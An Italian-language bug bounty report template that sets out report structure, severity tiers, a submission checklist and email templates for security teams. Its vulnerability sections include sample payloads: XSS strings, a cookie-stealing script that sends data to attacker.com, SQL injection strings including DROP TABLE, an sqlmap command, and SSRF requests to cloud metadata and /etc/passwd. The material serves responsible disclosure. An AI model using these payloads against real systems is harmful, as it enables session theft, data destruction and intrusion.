# 🐛 Modello di report per bug bounty

<!-- language-home-navigation -->
[🏠 Pagina iniziale italiana](../../README.it.md) • [🌐 Languages](../../README.md#-available-languages)

[🇬🇧 English](../Bug-Bounty-Report-Template.md) • [🇹🇷 Türkçe Sürüm](Bug-Bounty-Report-Template.tr.md) • [🇬🇷 Ελληνικά](Bug-Bounty-Report-Template.el.md)

```
██████╗ ██╗   ██╗ ██████╗     ██████╗  ██████╗ ██╗   ██╗███╗   ██╗████████╗██╗   ██╗
██╔══██╗██║   ██║██╔════╝     ██╔══██╗██╔═══██╗██║   ██║████╗  ██║╚══██╔══╝╚██╗ ██╔╝
██████╔╝██║   ██║██║  ███╗    ██████╔╝██║   ██║██║   ██║██╔██╗ ██║   ██║    ╚████╔╝ 
██╔══██╗██║   ██║██║   ██║    ██╔══██╗██║   ██║██║   ██║██║╚██╗██║   ██║     ╚██╔╝  
██████╔╝╚██████╔╝╚██████╔╝    ██████╔╝╚██████╔╝╚██████╔╝██║ ╚████║   ██║      ██║   
╚═════╝  ╚═════╝  ╚═════╝     ╚═════╝  ╚═════╝  ╚═════╝ ╚═╝  ╚═══╝   ╚═╝      ╚═╝   
██████╗ ███████╗██████╗  ██████╗ ██████╗ ████████╗
██╔══██╗██╔════╝██╔══██╗██╔═══██╗██╔══██╗╚══██╔══╝
██████╔╝█████╗  ██████╔╝██║   ██║██████╔╝   ██║   
██╔══██╗██╔══╝  ██╔═══╝ ██║   ██║██╔══██╗   ██║   
██║  ██║███████╗██║     ╚██████╔╝██║  ██║   ██║   
╚═╝  ╚═╝╚══════╝╚═╝      ╚═════╝ ╚═╝  ╚═╝   ╚═╝   
```

> **Nota sul modello:** i livelli di gravità e le priorità P1–P4 sono esempi orientativi, non classificazioni automatiche. Valuta l'impatto dimostrato e le regole del programma. CVSS:3.1 indica la versione del vettore di esempio: riporta sempre versione, vettore e motivazione del punteggio effettivamente usato. Riferimento: [specifica CVSS v3.1 di FIRST](https://www.first.org/cvss/v3-1/specification-document).

---

## 🎯 Modello rapido

```markdown
## Riepilogo
[Descrizione della vulnerabilità in una riga]

## Gravità
[Critica/Alta/Media/Bassa] - CVSS: X.X

## Tipo di vulnerabilità
[XSS/SQLi/IDOR/SSRF/ecc.]

## URL/Endpoint
`https://example.com/vulnerable-endpoint`

## Passaggi per riprodurre il problema
1. Passaggio 1
2. Passaggio 2
3. Passaggio 3

## Impatto
[Cosa può ottenere un attaccante]

## Proof of Concept
[Codice/Screenshot/Video]

## Correzione
[Come correggere il problema]
```

---

## 📝 Modello di report completo

### Formato del titolo
```
[Gravità] [Tipo di vulnerabilità] in [Funzionalità/Endpoint] consente [Impatto]

Esempi:
- [Critica] SQL Injection nel modulo di login consente l'estrazione del database
- [Alta] XSS persistente nei commenti consente la compromissione degli account
- [Media] IDOR in /api/users/{id} espone i dati personali di altri utenti
```

---

## 📋 Struttura dettagliata del report

````markdown
# [Tipo di vulnerabilità] in [Funzionalità/Endpoint]

## Riepilogo
È stata scoperta una vulnerabilità di tipo [tipo di vulnerabilità] in [funzionalità/endpoint] che
consente a un attaccante di [impatto]. Questa vulnerabilità interessa [ambito/utenti].

## Valutazione della gravità

| Metrica | Valore |
|--------|-------|
| **Gravità** | Critica / Alta / Media / Bassa |
| **Punteggio CVSS** | X.X |
| **Vettore CVSS** | CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H |
| **CWE** | CWE-XXX: [Nome della CWE] |

## Dettagli della vulnerabilità

### Asset interessato
- **URL:** `https://example.com/path/to/endpoint`
- **Parametro:** `parameter_name`
- **Metodo:** GET/POST
- **Autenticazione:** Richiesta/Non richiesta

### Codice/Configurazione vulnerabile
[Se visibile/applicabile]

## Passaggi per riprodurre il problema

### Prerequisiti
- Account richiesto: Sì/No
- Accesso speciale necessario: [descrivere]
- Browser/Strumento: [specificare]

### Procedura di riproduzione

1. **Aprire l'endpoint vulnerabile**
   ```
   https://example.com/vulnerable-page
   ```

2. **Inserire il payload**
   ```
   [Payload qui]
   ```

3. **Osservare il risultato**
   - [Cosa accade]

### Richiesta HTTP
```http
POST /api/endpoint HTTP/1.1
Host: example.com
Content-Type: application/json
Cookie: session=abc123

{
  "parameter": "malicious_payload_here"
}
```

### Risposta HTTP
```http
HTTP/1.1 200 OK
Content-Type: application/json

{
  "result": "vulnerable_response"
}
```

## Proof of Concept

### Payload utilizzato
```
[Il tuo payload qui]
```

### Screenshot come evidenza
![Descrizione](attachment_url)

### Video PoC
[Link al video dimostrativo]

### Script PoC automatizzato (facoltativo)
```python
import requests

url = "https://example.com/vulnerable"
payload = {"param": "malicious_input"}
response = requests.post(url, json=payload)
print(response.text)
```

## Valutazione dell'impatto

### Impatto tecnico
- **Riservatezza:** [Dati accessibili]
- **Integrità:** [Dati modificabili]
- **Disponibilità:** [Possibili interruzioni del servizio]

### Impatto aziendale
- [Impatto finanziario]
- [Danni reputazionali]
- [Violazioni normative/di conformità]
- [Numero di utenti interessati]

### Scenario di attacco
Un attaccante potrebbe sfruttare questa vulnerabilità per:
1. [Azione specifica 1]
2. [Azione specifica 2]
3. [Azione specifica 3]

## Raccomandazioni per la correzione

### Correzione immediata
[Intervento rapido per mitigare il problema]

### Soluzione a lungo termine
[Correzione strutturale]

### Esempio di correzione del codice
```python
# Prima (vulnerabile)
query = f"SELECT * FROM users WHERE id = {user_input}"

# Dopo (corretto)
query = "SELECT * FROM users WHERE id = %s"
cursor.execute(query, (user_input,))
```

## Riferimenti
- [Link OWASP]
- [Link CWE]
- [CVE correlate]
- [Articoli/Ricerche]

## Cronologia
| Data | Azione |
|------|--------|
| YYYY-MM-DD | Vulnerabilità scoperta |
| YYYY-MM-DD | Report inviato |
| YYYY-MM-DD | Ricezione confermata dal fornitore |
| YYYY-MM-DD | Correzione distribuita |
| YYYY-MM-DD | Ricompensa assegnata |
````

> **Nota sugli esempi:** `attachment_url` è un segnaposto per un allegato da fornire. La sintassi `%s` per i parametri SQL dipende dal driver Python utilizzato.

---

## 🔥 Modelli per tipo di vulnerabilità

### XSS (Cross-Site Scripting)

````markdown
## Riepilogo
Una vulnerabilità XSS riflessa/persistente in [endpoint] consente agli attaccanti di eseguire
JavaScript arbitrario nei browser delle vittime.

## Payload
```html
<script>alert(document.domain)</script>
<img src=x onerror=alert(1)>
"><svg onload=alert(1)>
```

## Impatto
- Dirottamento della sessione tramite furto dei cookie
- Compromissione degli account
- Registrazione dei tasti premuti (keylogging)
- Attacchi di phishing
- Distribuzione di malware

## PoC
```javascript
// Furto dei cookie
<script>
fetch('https://attacker.com/steal?c='+document.cookie)
</script>
```
````

> **Nota XSS:** `HttpOnly` impedisce la lettura del relativo cookie tramite `document.cookie`; l'impatto non equivale automaticamente al furto della sessione. Il frammento con `<script>` è destinato a un contesto HTML, anche se nell'originale è etichettato `javascript`. Riferimento: [MDN, attributo HttpOnly](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Set-Cookie#httponly).

### SQL Injection

````markdown
## Riepilogo
Una SQL Injection nel parametro [parametro] all'endpoint [endpoint] consente di estrarre il contenuto del database.

## Payload
```sql
' OR '1'='1'--
' UNION SELECT username,password FROM users--
1; DROP TABLE users--
```

## Evidenze
- Database: MySQL 8.0
- Tabelle estratte: users, orders, payments
- Record accessibili: 10,000+

## Comando SQLMap
```bash
sqlmap -u "https://example.com/page?id=1" --dbs --batch
```
````

### IDOR (Insecure Direct Object Reference)

````markdown
## Riepilogo
Una vulnerabilità IDOR in [endpoint] consente di accedere alla [risorsa] di altri utenti.

## Riproduzione
1. Accedere come utente A (ID: 100)
2. Accedere a: `GET /api/users/100/profile`
3. Modificare l'ID in 101: `GET /api/users/101/profile`
4. Osservare: vengono restituiti i dati dell'utente B

## Impatto
- Esposizione di dati personali (nome, email, indirizzo)
- Dati di [X] utenti accessibili
- Violazione del GDPR/della privacy

## Evidenze
| Richiesta | Risposta |
|---------|----------|
| `/api/users/100` | Dati dell'utente A ✓ |
| `/api/users/101` | Dati dell'utente B ✗ |
| `/api/users/102` | Dati dell'utente C ✗ |
````

### SSRF (Server-Side Request Forgery)

````markdown
## Riepilogo
Una SSRF in [funzionalità] consente di inviare richieste a servizi interni.

## Payload
```
https://example.com/fetch?url=http://169.254.169.254/latest/meta-data/
https://example.com/fetch?url=http://localhost:6379/
https://example.com/fetch?url=file:///etc/passwd
```

## Risorse interne raggiunte
- Endpoint dei metadati AWS
- Server Redis interno
- File system locale

## Evidenze
```
HTTP/1.1 200 OK

ami-id: ami-12345678
instance-id: i-1234567890abcdef0
```
````

> **Nota SSRF:** gli esempi non garantiscono l'accesso alle risorse indicate: dipendono da rete, protocolli supportati e configurazione. L'esempio dei metadati AWS presuppone un accesso senza le protezioni richieste da IMDSv2; gli ID mostrati nella risposta sono illustrativi. Riferimento: [AWS, accesso ai metadati con IMDSv2](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/configuring-instance-metadata-service.html).

### Bypass dell'autenticazione

```markdown
## Riepilogo
Un bypass dell'autenticazione in [funzionalità] consente l'accesso non autorizzato a [risorsa].

## Metodo di bypass
[Descrivere la tecnica di bypass]

## Riproduzione
1. Accedere all'endpoint protetto senza autenticazione
2. [Tecnica specifica]
3. Accesso consentito

## Impatto
- Accesso al pannello di amministrazione
- Impersonificazione degli utenti
- Manipolazione dei dati
```

---

## 📊 Indicazioni sulla gravità

### Critica (P1)
```
- RCE (Remote Code Execution: esecuzione di codice da remoto)
- SQL Injection con estrazione dei dati
- Bypass dell'autenticazione con accesso amministrativo
- Compromissione completa dell'account
- Manipolazione di pagamenti/operazioni finanziarie
- Esposizione dei dati personali di tutti gli utenti
```

### Alta (P2)
```
- XSS persistente con impatto significativo
- IDOR con accesso a dati sensibili
- SSRF verso servizi interni
- Escalation dei privilegi
- Esposizione di dati sensibili
```

### Media (P3)
```
- XSS riflesso
- CSRF su azioni sensibili
- Divulgazione di informazioni
- Bypass dei limiti di frequenza delle richieste (rate limiting)
- Fissazione della sessione (session fixation)
```

### Bassa (P4)
```
- Self-XSS
- IDOR su dati non sensibili
- Header di sicurezza mancanti
- Messaggi di errore troppo dettagliati
- Enumerazione dei nomi utente
```

---

## ✅ Checklist per l'invio

```markdown
## Prima dell'invio

□ Titolo chiaro e descrittivo
□ Valutazione della gravità accurata
□ Procedura di riproduzione passo per passo
□ Proof of Concept funzionante
□ Impatto spiegato chiaramente
□ Screenshot/video allegati
□ Correzione suggerita
□ Asset confermato come incluso nell'ambito
□ Verificata l'assenza di duplicati
□ Grammatica e ortografia controllate
□ Dati sensibili oscurati
□ Informazioni di contatto incluse
```

---

## 💡 Consigli pratici

### Cosa fare ✅
```
✓ Scrivere in modo chiaro e conciso
✓ Includere tutti i dettagli necessari
✓ Fornire una PoC funzionante
✓ Spiegare l'impatto
✓ Suggerire una correzione
✓ Essere professionali e rispettosi
✓ Seguire una divulgazione responsabile
✓ Rispondere tempestivamente alle domande
```

### Cosa evitare ❌
```
✗ Non accedere ai dati reali degli utenti
✗ Non eseguire test in produzione
✗ Non superare i limiti dell'ambito autorizzato
✗ Non usare scanner automatizzati senza permesso
✗ Non divulgare prima della correzione
✗ Non assumere toni aggressivi riguardo alla ricompensa
✗ Non inviare duplicati
✗ Non inviare problemi soltanto teorici
```

> **Nota sull'ambito:** l'indicazione relativa alla produzione è una regola prudenziale dell'originale. Alcuni programmi includono esplicitamente sistemi in produzione: fanno fede le autorizzazioni e le limitazioni del programma.

---

## 📧 Modelli di comunicazione

### Segnalazione iniziale
```
Salve [Team di sicurezza],

ho scoperto una vulnerabilità di tipo [tipo di vulnerabilità], con gravità [gravità], in
[prodotto/funzionalità]. Nel mio report sono disponibili tutti i dettagli.

Riepilogo: [Una riga]
Impatto: [Breve descrizione dell'impatto]
PoC: [Allegata/Inclusa]

Resto a disposizione per ulteriori informazioni.

Cordiali saluti,
[Il tuo nome]
[Profilo HackerOne/Bugcrowd]
```

### Richiesta di aggiornamento
```
Salve,

vi contatto per un aggiornamento sul report #[ID] inviato il [data].
Potreste indicarmi lo stato attuale?

Grazie.
```

### Discussione sulla ricompensa
```
Grazie per aver valutato il mio report. Ritengo che la gravità debba essere
[maggiore/diversa] per i seguenti motivi:

1. [Motivo 1]
2. [Motivo 2]

Potreste prendere in considerazione una nuova valutazione dell'importo della ricompensa?
```

---

**Torna alla reportistica:** [📝 Modelli di report](../../README.it.md#category-07)
